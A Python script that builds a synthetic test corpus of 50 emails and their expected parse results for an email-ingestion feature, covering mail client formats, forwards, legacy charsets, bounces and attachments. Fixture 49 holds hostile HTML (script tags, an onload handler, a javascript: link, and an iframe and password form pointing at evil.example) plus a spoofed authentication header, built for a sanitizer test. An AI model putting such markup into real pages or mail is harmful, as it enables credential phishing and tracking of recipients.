#!/usr/bin/env python3
"""
The inbound email corpus (phase 12, step E2; docs/OMNICHANNEL_STEP2.md): 50 synthetic emails in
the shapes real clients send (Gmail, Outlook, Apple Mail, mobile clients, Yahoo, Thunderbird),
forwarded chains, non-Latin character sets, auto-replies, bounces, signatures, attachments and
hostile HTML, each with what Relay must read from it.

No real person's mail is used: names, addresses and companies are invented (example.* domains).
Python builds them because it encodes the legacy character sets (ISO-2022-JP, Shift_JIS, GB2312,
Big5, EUC-KR, KOI8-R, windows-1251, ISO-8859-7, windows-1256) that Node can't without a package.

Run: python3 scripts/email-corpus.py  (writes tests/fixtures/email/*.eml and expected.json)
"""
import email.charset
import json
import os
from email.header import Header
from email.mime.application import MIMEApplication
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formataddr

OUT = os.path.join(os.path.dirname(__file__), "..", "tests", "fixtures", "email")
DATE = "Mon, 12 Oct 2026 09:41:00 +0100"
SUPPORT = "support@acme.example"
TRUSTED = "mx.cloudflare.net"
# A 1x1 PNG and a tiny PDF.
PNG = bytes.fromhex(
    "89504e470d0a1a0a0000000d4948445200000001000000010806000000"
    "1f15c4890000000d49444154789c6360000002000154a24f5d0000000049454e44ae426082"
)
PDF = b"%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"

corpus = []
os.makedirs(OUT, exist_ok=True)


def encoded(charset):
    """A charset whose headers are always encoded words (Python leaves some as raw 8-bit)."""
    cs = email.charset.Charset(charset)
    if cs.header_encoding is None:
        cs.header_encoding = email.charset.BASE64
    # Labelled as mail clients label them, not by Python's codec names (eucgb2312_cn, big5).
    if charset in ("gb2312", "big5"):
        cs.output_charset = charset
        cs.output_codec = charset
    return cs


def headers(msg, frm, subject, n, *, charset=None, to=SUPPORT, reply_to_id=None, refs=None, extra=None, auth=None):
    name, addr = frm
    msg["From"] = formataddr((Header(name, encoded(charset or "utf-8")).encode() if any(ord(c) > 127 for c in name) else name, addr))
    msg["To"] = to
    msg["Subject"] = Header(subject, encoded(charset)).encode() if charset and any(ord(c) > 127 for c in subject) else subject
    msg["Date"] = DATE
    msg["Message-ID"] = f"<msg-{n:02d}@mail.example.net>"
    if reply_to_id:
        msg["In-Reply-To"] = f"<{reply_to_id}>"
        msg["References"] = " ".join(f"<{r}>" for r in (refs or [reply_to_id]))
    if auth:
        msg["Authentication-Results"] = auth
    for k, v in (extra or {}).items():
        msg[k] = v
    return msg


def add(n, slug, msg, expect):
    path = os.path.join(OUT, f"{n:02d}-{slug}.eml")
    with open(path, "wb") as f:
        f.write(msg.as_bytes())
    corpus.append({"file": os.path.basename(path), **expect})


def alt(text, html, charset="utf-8"):
    m = MIMEMultipart("alternative")
    m.attach(MIMEText(text, "plain", charset))
    m.attach(MIMEText(html, "html", charset))
    return m


def message(n, slug, frm, subject, text, expect_text, *, html=None, charset="utf-8", reply=True, kind="message", extra=None, auth=None, more=None):
    msg = alt(text, html, charset) if html else MIMEText(text, "plain", encoded(charset) if charset in ("gb2312", "big5") else charset)
    headers(msg, frm, subject, n, charset=charset, reply_to_id="relay-reply-1@acme.example" if reply else None, extra=extra, auth=auth)
    add(n, slug, msg, {"kind": kind, "from": frm[1], "subject": subject, "text": expect_text, **(more or {})})


JANE = ("Jane Doe", "jane@customer.example")
QUOTE_EN = "> Thanks for writing in. Could you send your order number?\n>\n> Best,\n> Acme Support\n"

# ---------------------------------------------------------------------------------------------
# Gmail (1-6)
message(1, "gmail-reply", JANE, "Re: Late order",
        "It's order 1042, placed last Tuesday.\n\nOn Mon, Oct 12, 2026 at 9:15 AM Acme Support <support@acme.example> wrote:\n\n" + QUOTE_EN,
        "It's order 1042, placed last Tuesday.",
        html='<div dir="ltr">It\'s order 1042, placed last Tuesday.</div><br><div class="gmail_quote"><div dir="ltr" class="gmail_attr">On Mon, Oct 12, 2026 at 9:15 AM Acme Support &lt;support@acme.example&gt; wrote:<br></div><blockquote class="gmail_quote">Thanks for writing in.</blockquote></div>',
        auth=f"{TRUSTED}; dkim=pass header.d=customer.example; spf=pass smtp.mailfrom=customer.example; dmarc=pass header.from=customer.example",
        more={"verified": True, "stripped": True})
message(2, "gmail-wrapped-header", ("Ravi Patel", "ravi@customer.example"), "Re: Refund",
        "Yes please, refund to the original card.\n\nOn Mon, Oct 12, 2026 at 9:15 AM Acme Support <support@acme.\nexample> wrote:\n\n" + QUOTE_EN,
        "Yes please, refund to the original card.", more={"stripped": True})
message(3, "gmail-quotes-only", ("Ana Lima", "ana@customer.example"), "Re: Your question",
        "That works for me, thank you!\n\n> Would Thursday at 2pm suit you?\n> Acme Support\n",
        "That works for me, thank you!", more={"stripped": True})
message(4, "gmail-spanish", ("Lucía Gómez", "lucia@customer.example"), "Re: Pedido",
        "Gracias, ya lo recibí.\n\nEl lun, 12 oct 2026 a las 9:15, Acme Support (<support@acme.example>) escribió:\n\n> Su pedido ha sido enviado.\n",
        "Gracias, ya lo recibí.", more={"stripped": True})
message(5, "gmail-french", ("Chloé Martin", "chloe@customer.example"), "Re: Facture",
        "Merci, c'est réglé.\n\nLe lun. 12 oct. 2026 à 09:15, Acme Support <support@acme.example> a écrit :\n\n> Votre facture est jointe.\n",
        "Merci, c'est réglé.", more={"stripped": True})
message(6, "gmail-german", ("Lukas Weber", "lukas@customer.example"), "Re: Lieferung",
        "Danke, das Paket ist angekommen.\n\nAm Mo., 12. Okt. 2026 um 09:15 Uhr schrieb Acme Support <support@acme.example>:\n\n> Ihr Paket ist unterwegs.\n",
        "Danke, das Paket ist angekommen.", more={"stripped": True})

# ---------------------------------------------------------------------------------------------
# Outlook (7-14)
OUTLOOK_BLOCK = "\n________________________________\nFrom: Acme Support <support@acme.example>\nSent: Monday, October 12, 2026 9:15 AM\nTo: Sam Okafor <sam@customer.example>\nSubject: RE: Account access\n\nCould you confirm the email on the account?\n"
message(7, "outlook-desktop", ("Sam Okafor", "sam@customer.example"), "RE: Account access",
        "Hi,\n\nThe email is sam@customer.example.\n\nKind regards,\nSam\n" + OUTLOOK_BLOCK,
        "Hi,\n\nThe email is sam@customer.example.\n\nKind regards,\nSam", more={"stripped": True})
message(8, "outlook-html", ("Mei Chen", "mei@customer.example"), "RE: Invoice copy",
        "Thanks, received.\n" + OUTLOOK_BLOCK,
        "Thanks, received.",
        html='<html><body><div>Thanks, received.</div><div id="appendonsend"></div><hr><div id="divRplyFwdMsg"><b>From:</b> Acme Support<br><b>Sent:</b> Monday</div><div>Could you confirm?</div></body></html>',
        more={"stripped": True})
message(9, "outlook-original-message", ("Tom Byrne", "tom@customer.example"), "RE: Delivery date",
        "Friday is fine.\n\n-----Original Message-----\nFrom: Acme Support [mailto:support@acme.example]\nSent: Monday, October 12, 2026 9:15 AM\nTo: Tom Byrne\nSubject: Delivery date\n\nWould Friday work?\n",
        "Friday is fine.", more={"stripped": True})
message(10, "outlook-german", ("Anna Schmidt", "anna@customer.example"), "AW: Rückgabe",
        "Bitte holen Sie es am Montag ab.\n\nVon: Acme Support <support@acme.example>\nGesendet: Montag, 12. Oktober 2026 09:15\nAn: Anna Schmidt\nBetreff: Rückgabe\n\nWann passt die Abholung?\n",
        "Bitte holen Sie es am Montag ab.", more={"stripped": True})
message(11, "outlook-french", ("Hugo Bernard", "hugo@customer.example"), "RE: Abonnement",
        "Oui, je confirme la résiliation.\n\nDe : Acme Support <support@acme.example>\nEnvoyé : lundi 12 octobre 2026 09:15\nÀ : Hugo Bernard\nObjet : Abonnement\n\nSouhaitez-vous résilier ?\n",
        "Oui, je confirme la résiliation.", more={"stripped": True})
message(12, "outlook-ios", ("Priya Nair", "priya@customer.example"), "RE: Password reset",
        "Done, I'm back in. Thanks!\n\nGet Outlook for iOS\n" + OUTLOOK_BLOCK,
        "Done, I'm back in. Thanks!", more={"stripped": True})
message(13, "outlook-android", ("Omar Haddad", "omar@customer.example"), "RE: Trial",
        "Please extend it by a week.\n\nGet Outlook for Android\n\nFrom: Acme Support <support@acme.example>\nSent: Monday, October 12, 2026 9:15:00 AM\nTo: Omar Haddad\nSubject: Trial\n\nYour trial ends soon.\n",
        "Please extend it by a week.", more={"stripped": True})
msg14 = MIMEText('<html><body><p>Can you send the receipt again?</p><div id="appendonsend"></div><hr style="display:inline-block;width:98%"><div id="divRplyFwdMsg" dir="ltr"><font face="Calibri"><b>From:</b> Acme Support &lt;support@acme.example&gt;<br><b>Sent:</b> Monday, October 12, 2026 9:15 AM</font></div><div>Here is your receipt.</div></body></html>', "html", "utf-8")
headers(msg14, ("Leo Rossi", "leo@customer.example"), "RE: Receipt", 14, reply_to_id="relay-reply-1@acme.example")
add(14, "outlook-web-html-only", msg14, {"kind": "message", "from": "leo@customer.example", "subject": "RE: Receipt", "text": "Can you send the receipt again?", "stripped": True})

# ---------------------------------------------------------------------------------------------
# Apple Mail and phones (15-21)
message(15, "apple-mail", ("Noah Kim", "noah@customer.example"), "Re: Warranty",
        "The serial number is AC-7731.\n\n> On 12 Oct 2026, at 09:15, Acme Support <support@acme.example> wrote:\n>\n> Could you send the serial number?\n",
        "The serial number is AC-7731.",
        html='<html><body><div>The serial number is AC-7731.</div><div><br><blockquote type="cite"><div>On 12 Oct 2026, at 09:15, Acme Support wrote:</div><div>Could you send the serial number?</div></blockquote></div></body></html>',
        more={"stripped": True})
message(16, "iphone", ("Emma Wilson", "emma@customer.example"), "Re: Booking",
        "Perfect, see you then.\n\nSent from my iPhone\n\n> On 12 Oct 2026, at 09:15, Acme Support <support@acme.example> wrote:\n>\n> Your booking is confirmed for Friday.\n",
        "Perfect, see you then.", more={"stripped": True})
message(17, "iphone-french", ("Léa Petit", "lea@customer.example"), "Re: Réservation",
        "Parfait, merci.\n\nEnvoyé de mon iPhone\n\n> Le 12 oct. 2026 à 09:15, Acme Support <support@acme.example> a écrit :\n>\n> Votre réservation est confirmée.\n",
        "Parfait, merci.", more={"stripped": True})
message(18, "android-galaxy", ("Kwame Mensah", "kwame@customer.example"), "Re: Order 2210",
        "Still waiting for the tracking link.\n\nSent from my Galaxy\n\n-------- Original message --------\nFrom: Acme Support <support@acme.example>\nDate: 12/10/2026 09:15 (GMT+00:00)\nTo: Kwame Mensah\nSubject: Order 2210\n\nYour order has shipped.\n",
        "Still waiting for the tracking link.", more={"stripped": True})
message(19, "samsung-mobile", ("Yuki Tanaka", "yuki@customer.example"), "Re: Coupon",
        "The code says expired.\n\nSent from Samsung Mobile\n",
        "The code says expired.", more={"stripped": True})
message(20, "yahoo-html", ("Olga Ivanova", "olga@customer.example"), "Re: Shipping address",
        "Please use my new address: 4 Elm Road.\n\nOn Monday, October 12, 2026, 09:15:00 AM GMT+1, Acme Support <support@acme.example> wrote:\n\nWhich address should we use?\n",
        "Please use my new address: 4 Elm Road.",
        html='<html><body><div class="ydp1"><div>Please use my new address: 4 Elm Road.</div></div><div id="yahoo_quoted_1" class="yahoo_quoted"><div>On Monday, October 12, 2026, Acme Support wrote:</div><div>Which address should we use?</div></div></body></html>',
        more={"stripped": True})
message(21, "yahoo-android", ("Ben Carter", "ben@customer.example"), "Re: Bill",
        "Paid this morning.\n\nSent from Yahoo Mail on Android\n\nOn Mon, 12 Oct 2026 at 9:15, Acme Support<support@acme.example> wrote:\n\nYour bill is due.\n",
        "Paid this morning.", more={"stripped": True})

# ---------------------------------------------------------------------------------------------
# Thunderbird (22-23)
message(22, "thunderbird", ("Ines Duarte", "ines@customer.example"), "Re: Export",
        "The export finished, thanks.\n\nOn 12/10/2026 09:15, Acme Support wrote:\n> Let us know when the export finishes.\n",
        "The export finished, thanks.",
        html='<html><body><p>The export finished, thanks.</p><div class="moz-cite-prefix">On 12/10/2026 09:15, Acme Support wrote:<br></div><blockquote type="cite">Let us know.</blockquote></body></html>',
        more={"stripped": True})
message(23, "thunderbird-dutch", ("Daan de Vries", "daan@customer.example"), "Re: Retour",
        "Het pakket is verstuurd.\n\nOp 12-10-2026 om 09:15 schreef Acme Support:\n> Stuur het pakket terug.\n",
        "Het pakket is verstuurd.", more={"stripped": True})

# ---------------------------------------------------------------------------------------------
# Forwarded chains: kept whole (24-27)
FWD_GMAIL = "Can you help with this? It came from our bank.\n\n---------- Forwarded message ---------\nFrom: Bank Notices <notices@bank.example>\nDate: Mon, Oct 12, 2026 at 8:00 AM\nSubject: Payment declined\nTo: <jane@customer.example>\n\nYour payment to Acme was declined.\n"
message(24, "forward-gmail", JANE, "Fwd: Payment declined", FWD_GMAIL, FWD_GMAIL.strip(), reply=False, more={"forwarded": True})
FWD_APPLE = "See below.\n\nBegin forwarded message:\n\nFrom: Courier <tracking@courier.example>\nSubject: Delivery attempted\nDate: 12 October 2026 at 08:00:00 BST\nTo: Noah Kim <noah@customer.example>\n\nWe tried to deliver your parcel.\n"
message(25, "forward-apple", ("Noah Kim", "noah@customer.example"), "Fwd: Delivery attempted", FWD_APPLE, FWD_APPLE.strip(), reply=False, more={"forwarded": True})
FWD_OUTLOOK = "Forwarding the confirmation as requested.\n\n________________________________\nFrom: Acme Store <orders@acme.example>\nSent: Sunday, October 11, 2026 6:00 PM\nTo: Sam Okafor <sam@customer.example>\nSubject: Order confirmation\n\nThank you for your order 3301.\n"
message(26, "forward-outlook", ("Sam Okafor", "sam@customer.example"), "FW: Order confirmation", FWD_OUTLOOK, FWD_OUTLOOK.strip(), reply=False, more={"forwarded": True})
FWD_CHAIN = "Looping you in: see the thread below.\n\n---------- Forwarded message ---------\nFrom: Mei Chen <mei@customer.example>\nDate: Sun, Oct 11, 2026 at 5:00 PM\nSubject: Re: Duplicate charge\nTo: Finance <finance@customer.example>\n\nWe were charged twice.\n\nOn Sun, Oct 11, 2026 at 4:00 PM Finance <finance@customer.example> wrote:\n> Which invoice?\n"
message(27, "forward-chain", ("Tom Byrne", "tom@customer.example"), "Fwd: Re: Duplicate charge", FWD_CHAIN, FWD_CHAIN.strip(), reply=False, more={"forwarded": True})

# ---------------------------------------------------------------------------------------------
# Non-Latin character sets (28-35)
message(28, "iso-2022-jp", ("山田 花子", "hanako@customer.example"), "Re: 注文について",
        "注文番号は1042です。\n\n2026年10月12日(月) 9:15 Acme Support <support@acme.example>:\n\n> 注文番号を教えてください。\n",
        "注文番号は1042です。", charset="iso-2022-jp", more={"stripped": True})
message(29, "shift-jis", ("佐藤 太郎", "taro@customer.example"), "配送状況の確認",
        "荷物がまだ届いていません。確認をお願いします。\n", "荷物がまだ届いていません。確認をお願いします。", charset="shift_jis", reply=False)
message(30, "gb2312", ("王 伟", "wei@customer.example"), "回复：退款申请",
        "我已经收到退款了，谢谢。\n\nAcme Support <support@acme.example> 于2026年10月12日周一 上午9:15写道：\n\n> 退款已处理。\n",
        "我已经收到退款了，谢谢。", charset="gb2312", more={"stripped": True})
message(31, "big5", ("陳 美玲", "meiling@customer.example"), "帳戶問題",
        "我無法登入我的帳戶，請協助。\n", "我無法登入我的帳戶，請協助。", charset="big5", reply=False)
message(32, "euc-kr", ("김 민준", "minjun@customer.example"), "Re: 배송 문의",
        "네, 확인했습니다. 감사합니다.\n\n2026년 10월 12일 (월) 오전 9:15, Acme Support <support@acme.example>님이 작성:\n\n> 배송이 시작되었습니다.\n",
        "네, 확인했습니다. 감사합니다.", charset="euc-kr", more={"stripped": True})
message(33, "koi8-r", ("Иван Петров", "ivan@customer.example"), "Вопрос по счёту",
        "Здравствуйте! В счёте указана неверная сумма.\n", "Здравствуйте! В счёте указана неверная сумма.", charset="koi8-r", reply=False)
message(34, "windows-1251-reply", ("Ольга Смирнова", "olga.s@customer.example"), "Re: Доставка",
        "Спасибо, посылка пришла.\n\nпн, 12 окт. 2026 г. в 09:15, Acme Support <support@acme.example>:\n\n> Ваша посылка отправлена.\n",
        "Спасибо, посылка пришла.", charset="windows-1251", more={"stripped": True})
message(35, "iso-8859-7", ("Νίκος Παπαδόπουλος", "nikos@customer.example"), "Ερώτηση για παραγγελία",
        "Πότε θα φτάσει η παραγγελία μου;\n", "Πότε θα φτάσει η παραγγελία μου;", charset="iso-8859-7", reply=False)

# ---------------------------------------------------------------------------------------------
# Auto-replies (36-40)
def auto(n, slug, frm, subject, text, extra, reason):
    msg = MIMEText(text, "plain", "utf-8")
    headers(msg, frm, subject, n, reply_to_id="relay-reply-1@acme.example", extra=extra)
    add(n, slug, msg, {"kind": "auto_reply", "from": frm[1], "subject": subject, "text": text.strip(), "reason": reason})

auto(36, "auto-submitted", ("Grace Lee", "grace@customer.example"), "Re: Your request", "I'm on leave until 19 October.\n", {"Auto-Submitted": "auto-replied"}, "An automatic reply.")
auto(37, "x-autoreply", ("Ali Hassan", "ali@customer.example"), "Re: Your request", "Thanks, we received your email.\n", {"X-Autoreply": "yes"}, "An automatic reply.")
auto(38, "precedence", ("Desk", "desk@customer.example"), "Re: Your request", "Ticket 55120 created.\n", {"Precedence": "auto_reply"}, "An automatic reply.")
auto(39, "outlook-automatic-reply", ("Sam Okafor", "sam@customer.example"), "Automatic reply: Account access", "I'm out of the office until Monday.\n", {"X-Auto-Response-Suppress": "All"}, "An automatic reply (out of office).")
auto(40, "abwesenheitsnotiz", ("Anna Schmidt", "anna@customer.example"), "Abwesenheitsnotiz: Rückgabe", "Ich bin bis zum 20. Oktober nicht im Büro.\n", {}, "An automatic reply (out of office).")

# ---------------------------------------------------------------------------------------------
# Bounces (41-44)
def dsn(n, slug, recipient, status, action, subject, frm=("Mail Delivery System", "MAILER-DAEMON@mail.acme.example"), name_text="Your message couldn't be delivered.\n"):
    # Written out: a delivery status part is its own little header block.
    raw = (
        f"From: {formataddr(frm)}\r\nTo: {SUPPORT}\r\nSubject: {subject}\r\nDate: {DATE}\r\n"
        f"Message-ID: <msg-{n:02d}@mail.example.net>\r\nIn-Reply-To: <relay-out-7@acme.example>\r\nReferences: <relay-out-7@acme.example>\r\n"
        "MIME-Version: 1.0\r\nContent-Type: multipart/report; report-type=delivery-status; boundary=\"DSN\"\r\n\r\n"
        f"--DSN\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n{name_text}\r\n"
        "--DSN\r\nContent-Type: message/delivery-status\r\n\r\nReporting-MTA: dns; mail.acme.example\r\n\r\n"
        f"Final-Recipient: rfc822; {recipient}\r\nAction: {action}\r\nStatus: {status}\r\nDiagnostic-Code: smtp; {status} mailbox problem\r\n\r\n"
        "--DSN--\r\n"
    )
    path = os.path.join(OUT, f"{n:02d}-{slug}.eml")
    with open(path, "wb") as f:
        f.write(raw.encode("utf-8"))
    corpus.append({"file": os.path.basename(path), "kind": "bounce", "from": frm[1].lower(), "subject": subject, "bounce": {"hard": status.startswith("5") and action == "failed", "recipients": [recipient.lower()]}})


dsn(41, "dsn-hard", "gone@customer.example", "5.1.1", "failed", "Delivery Status Notification (Failure)")
dsn(42, "dsn-delayed", "slow@customer.example", "4.4.7", "delayed", "Delivery Status Notification (Delay)")
dsn(43, "exchange-ndr", "Former.Employee@Customer.example", "5.1.10", "failed", "Undeliverable: Your order", frm=("Microsoft Outlook", "postmaster@customer.example"), name_text="Your message to Former.Employee@Customer.example couldn't be delivered.\n")
msg44 = MIMEText("Hi. This is the qmail-send program at mx.customer.example.\nI'm afraid I wasn't able to deliver your message to the following addresses.\nThis is a permanent error; I've given up. Sorry it didn't work out.\n\n<nobody@customer.example>:\n550 5.1.1 <nobody@customer.example>: Recipient address rejected: User unknown\n", "plain", "utf-8")
headers(msg44, ("", "MAILER-DAEMON@mx.customer.example"), "failure notice", 44)
add(44, "qmail-failure", msg44, {"kind": "bounce", "from": "mailer-daemon@mx.customer.example", "subject": "failure notice", "bounce": {"hard": True, "recipients": ["nobody@customer.example"]}})

# ---------------------------------------------------------------------------------------------
# Signatures (45-46)
message(45, "signature-delimiter", ("Jane Doe", "jane@customer.example"), "Question about plans",
        "Do you offer a yearly plan?\n\n-- \nJane Doe\nOperations Lead, Customer Co.\n+44 20 7946 0000\n",
        "Do you offer a yearly plan?", reply=False, more={"stripped": True})
message(46, "sign-off-kept", ("Ravi Patel", "ravi@customer.example"), "Feature request",
        "Could you add dark mode to the dashboard?\n\nBest,\nRavi\n",
        "Could you add dark mode to the dashboard?\n\nBest,\nRavi", reply=False, more={"stripped": False})

# ---------------------------------------------------------------------------------------------
# Attachments (47-48)
msg47 = MIMEMultipart("mixed")
msg47.attach(MIMEText("Here are the invoice and a screenshot.\n", "plain", "utf-8"))
part = MIMEApplication(PDF, "pdf")
part.add_header("Content-Disposition", "attachment", filename="invoice-1042.pdf")
msg47.attach(part)
img = MIMEImage(PNG, "png")
img.add_header("Content-Disposition", "attachment", filename="screenshot.png")
msg47.attach(img)
headers(msg47, ("Mei Chen", "mei@customer.example"), "Billing screenshots", 47)
add(47, "attachments", msg47, {"kind": "message", "from": "mei@customer.example", "subject": "Billing screenshots", "text": "Here are the invoice and a screenshot.", "attachments": ["invoice-1042.pdf", "screenshot.png"]})
msg48 = MIMEMultipart("mixed")
related = MIMEMultipart("related")
related.attach(alt("See the error below.\n[image: error.png]\n", '<p>See the error below.</p><img src="cid:error-shot@customer.example" alt="error">'))
inline = MIMEImage(PNG, "png")
inline.add_header("Content-ID", "<error-shot@customer.example>")
inline.add_header("Content-Disposition", "inline", filename="error.png")
related.attach(inline)
msg48.attach(related)
doc = MIMEApplication(b"PK\x03\x04 not really a document", "vnd.openxmlformats-officedocument.wordprocessingml.document")
doc.add_header("Content-Disposition", "attachment", filename="steps.docx")
msg48.attach(doc)
headers(msg48, ("Leo Rossi", "leo@customer.example"), "Error on checkout", 48)
add(48, "inline-image", msg48, {"kind": "message", "from": "leo@customer.example", "subject": "Error on checkout", "text": "See the error below.\n[image: error.png]", "attachments": ["steps.docx"], "inlineImages": 1})

# ---------------------------------------------------------------------------------------------
# Hostile HTML, and a quoted-printable message (49-50)
msg49 = MIMEText('<html><head><style>body{background:url(https://tracker.example/s.gif)}</style><script>alert(1)</script></head><body onload="steal()"><p style="color:red;position:fixed;background:url(https://t.example/x)">Please check my account.</p><img src="https://tracker.example/pixel.gif" width="1" height="1"><a href="javascript:alert(1)">click</a> <a href="https://help.example/guide">guide</a><iframe src="https://evil.example"></iframe><form action="https://evil.example"><input name="password"></form></body></html>', "html", "utf-8")
headers(msg49, ("Ana Lima", "ana@customer.example"), "Account check", 49, auth="evil.example; dmarc=pass header.from=customer.example")
add(49, "hostile-html", msg49, {"kind": "message", "from": "ana@customer.example", "subject": "Account check", "text": "Please check my account.\nclick guide", "verified": False, "remoteImages": 1,
                                "htmlMustNotContain": ["<script", "onload", "javascript:", "<iframe", "<form", "<input", "position", "url(", ' src="https://tracker'], "htmlMustContain": ['data-remote-src="https://tracker.example/pixel.gif"', 'href="https://help.example/guide"', "color: red"]})
QP_TEXT = "Hello! I'd like to upgrade to the Team plan 🚀 — could you send a quote for twelve seats with annual billing, please? Thanks so much.\n"
qp = email.charset.Charset("utf-8")
qp.body_encoding = email.charset.QP
msg50 = MIMEText(QP_TEXT, "plain", qp)
headers(msg50, ("Kwame Mensah", "kwame@customer.example"), "Upgrade quote", 50, auth=f"{TRUSTED}; dmarc=fail header.from=customer.example")
add(50, "quoted-printable", msg50, {"kind": "message", "from": "kwame@customer.example", "subject": "Upgrade quote", "text": "Hello! I'd like to upgrade to the Team plan 🚀 — could you send a quote for twelve seats with annual billing, please? Thanks so much.", "verified": False})

os.makedirs(OUT, exist_ok=True)
with open(os.path.join(OUT, "expected.json"), "w", encoding="utf-8") as f:
    json.dump({"trustedAuthServ": [TRUSTED], "emails": corpus}, f, ensure_ascii=False, indent=1)
print(f"Wrote {len(corpus)} emails to {os.path.relpath(OUT)}")
